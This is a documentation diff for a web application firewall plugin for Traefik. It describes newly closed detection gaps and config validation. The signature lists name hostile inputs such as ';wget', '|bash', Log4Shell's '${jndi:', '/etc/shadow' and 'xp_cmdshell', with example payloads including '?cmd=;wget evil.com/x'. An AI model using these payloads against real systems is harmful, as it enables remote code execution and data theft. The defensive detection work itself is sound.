@@ -7,7 +7,8 @@
 | `body.maxInspectBytes` | int | `1048576` | Max bytes of request body inspected. |
 | `body.overCap` | `pass` \| `block` | `pass` | When body exceeds cap: `pass` lets Traefik forward; `block` returns 403. |
 | `groups.injection` | `{ enabled, mode }` | `{true, enforce}` | SQLi + XSS via libinjection. |
-| `groups.signatures` | `{ enabled, mode }` | `{true, enforce}` | Known-bad literal scanner (path traversal, RCE, scanner UAs). |
+| `groups.signatures` | `{ enabled, mode }` | `{true, enforce}` | Known-bad literal scanner (path traversal, LFI incl. `/etc/shadow` `/proc/self/environ` `/WEB-INF/`, shell-command injection `;wget`/`;curl`/`\|bash`, `${jndi:` Log4Shell, `php://`/`phar://`/`expect://` wrappers, `xp_cmdshell`, scanner UAs). |
+| `groups.structural` | `{ enabled, mode }` | `{true, monitor}` | Method allowlist, header size/count caps, NUL-byte + CR/LF in path/query. |
 | `groups.structural` | `{ enabled, mode }` | `{true, monitor}` | Method allowlist + header anomalies. |
 | `groups.reputation` | `{ enabled, mode }` | `{false, monitor}` | Per-IP rate limit + IP deny list. |
 | `reputation.perSecond` | int | `100` | Per-IP token rate. **Per Traefik pod**; effective rate = configured × pod count. |
@@ -148,18 +149,43 @@ overall TPR with 0% FPR on the benign corpus, vs Coraza http-wasm at
 6.11% TPR on the same yardstick. Numbers are honest, low, and
 intentional — they're the cost of context-aware-only detection.
 
-### Known coverage gaps (empirical)
+### Closed coverage gaps
 
-Specific patterns that the live-stack benchmark proved are NOT
-blocked. Surface them so operators don't assume coverage they don't
-have. Workarounds noted; threat-model rationale is in
-[THREAT_MODEL.md §3.2.1](../THREAT_MODEL.md).
+The two empirical gaps the round-2 benchmark surfaced are now closed:
 
-| Class | Example payload | Why it slips through | Workaround |
-|---|---|---|---|
-| User-Agent SQLi with `Mozilla/` prefix | `User-Agent: Mozilla/5.0 1 OR 1=1` | libinjection treats Mozilla-prefixed strings as user-agent content, not a SQL expression context | Add custom UA signatures upstream, or validate UA-derived fields at the backend |
-| Bare shell-command in query (`;wget`, `;curl`, `;nc`) | `?cmd=;wget evil.com/x` | No literal signature for `;<cmd>` patterns (the signatures group catches `$(...)`, `` ` ``, `/bin/sh` but not bare `;cmd`) | Add to a custom signature set (compile-time today; runtime customization is future work) |
+| Class | Example payload | How it's now caught |
+|---|---|---|
+| User-Agent SQLi with `Mozilla/` prefix | `User-Agent: Mozilla/5.0 1 OR 1=1` | The injection detector re-probes the UA suffix (after the prefix token / last `)`) with libinjection, so the isolated SQL tail is tokenized without the UA-shaped prefix steering the verdict. |
+| Bare shell-command in query (`;wget`, `;curl`, `;nc`) | `?cmd=;wget evil.com/x` | The signature table now carries collision-aware `rce_cmd` literals (`;wget` `;curl` `;bash` `;nc ` `\|bash` `\|sh `). |
 
-These are *additions* to the existing precision-over-recall stance,
-not regressions — same design, just surfaced explicitly so adopters
-don't infer coverage that isn't there.
+Additional signatures added in the same pass: `${jndi:` (Log4Shell),
+`php://` / `phar://` / `expect://` wrappers, `/etc/shadow`,
+`/proc/self/environ`, `/WEB-INF/`, `xp_cmdshell`. The structural group
+also gained `null_byte` and `crlf_injection` checks over the decoded
+path and query. Multiply-encoded payloads are normalized by bounded
+percent-decode-to-fixpoint before inspection.
+
+### Remaining limitations
+
+The precision-over-recall stance is unchanged: purple-wolf still does
+not replicate CRS's atomic-token regex rules, and detection of
+context-free single tokens remains intentionally low. Closing the two
+gaps above does not change that posture — it removes two specific,
+high-value misses without raising the benign false-positive rate (the
+expanded benign corpus in `tests/corpus/clean/` holds the 0% FPR gate).
+
+## Validating a config offline
+
+Before deploying a Middleware change, validate it in CI with the
+`purple-wolf-validate` binary — it parses the plugin config with the
+exact same adapter the live guest uses and exits non-zero on any error
+(including a typo'd key, which at runtime would silently demote the
+Middleware to the all-monitor fallback):
+
+```bash
+purple-wolf-validate path/to/plugin-config.json   # or: cat config.json | purple-wolf-validate
+```
+
+When the plugin *is* running on the fallback config, every audit line
+carries `"config_fallback":true` so dashboards can alert that
+enforcement is off — not just the one startup log line.
